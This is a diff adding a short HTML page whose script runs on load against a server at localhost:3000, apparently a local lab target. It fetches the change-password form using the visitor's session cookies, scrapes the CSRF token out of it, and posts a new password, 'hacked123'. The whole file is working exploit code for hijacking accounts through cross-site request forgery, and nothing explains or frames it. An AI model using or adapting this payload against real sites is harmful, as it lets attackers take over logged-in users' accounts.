@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+(async () => {
+
+  const getResp = await fetch("http://localhost:3000/change_password", {
+    credentials: "include"
+  });
+  const html = await getResp.text();
+
+  const match = html.match(/name="csrf_token" value="([^"]+)"/);
+  const csrfToken = match[1];
+
+  const body = new URLSearchParams({
+    csrf_token: csrfToken,
+    new_password: "hacked123"
+  });
+
+  await fetch("http://localhost:3000/change_password", {
+    method: "POST",
+    credentials: "include",
+    body: body
+  });
+})();
+</script>
+</body>
+</html>
